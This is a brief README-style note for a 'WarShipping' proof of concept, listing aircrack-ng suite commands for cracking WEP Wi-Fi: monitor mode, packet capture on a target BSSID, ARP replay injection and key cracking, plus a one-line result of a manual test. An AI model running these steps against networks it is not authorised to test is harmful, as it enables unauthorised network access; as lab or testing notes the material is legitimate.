# WarShipping
WarShipping remixed as a proof of concept.

WEP cracking using airmon-ng
- iwconfig
- airmon-ng start <wireless card>
- airodump-ng <mon card>
- airodump-ng <mon card> --bssid <bssid> -w <write to file> file
(if theres not enough traffic to crack the password)
on another tab:
- aireplay-ng -3 -b <bssid> -h <host connected to network> <mon card>
(cracking the password)
- aircrack-ng <file>.cap

Test 0 (Manual attack)
- manual testing worked, arp poisoning aided but not required with active network.
- one terminal window required unless arp poisoning required.
